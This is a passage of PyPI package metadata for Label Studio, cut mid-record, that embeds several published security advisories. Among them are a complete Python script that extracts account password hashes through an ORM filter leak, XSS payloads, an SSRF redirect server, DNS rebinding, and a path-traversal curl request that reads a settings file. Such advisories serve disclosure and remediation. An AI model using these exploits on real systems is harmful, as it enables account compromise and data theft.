`pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.4.6.post1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.6.post1/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.2.4)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (==4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","murmurhash (==1.0.2)","numpy (==1.17.4)","plac (==0.9.6)","preshed (==2.0.1)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.9)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.4.6.post1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"ae42f20757b904630ac4ced695d389c70eda0de113d7d41e6ab8ee955e7a518a","md5":"7bd1da4e20156c4d7e9eadc393f697ad","sha256":"0388f5928fd1552b66fcda0de915c3cc25459f5efb692c0440379bc53a089028"},"downloads":-1,"filename":"label_studio-0.4.6.post1-py3-none-any.whl","has_sig":false,"md5_digest":"7bd1da4e20156c4d7e9eadc393f697ad","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":7313860,"upload_time":"2020-02-07T21:16:50","upload_time_iso_8601":"2020-02-07T21:16:50.370802Z","url":"https://files.pythonhosted.org/packages/ae/42/f20757b904630ac4ced695d389c70eda0de113d7d41e6ab8ee955e7a518a/label_studio-0.4.6.post1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"1281d7d48be9cb7ae52eaf61325462089c3afbae2e894d4e262c782baa2587a3","md5":"9223493f39efb3099cdacbabbfca10ee","sha256":"0ed896811f99dcde758ce33c4bce2b35af00927542aa6813880b8d5e4d0807e2"},"downloads":-1,"filename":"label-studio-0.4.6.post1.tar.gz","has_sig":false,"md5_digest":"9223493f39efb3099cdacbabbfca10ee","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":7243218,"upload_time":"2020-02-07T21:17:29","upload_time_iso_8601":"2020-02-07T21:17:29.331847Z","url":"https://files.pythonhosted.org/packages/12/81/d7d48be9cb7ae52eaf61325462089c3afbae2e894d4e262c782baa2587a3/label-studio-0.4.6.post1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, 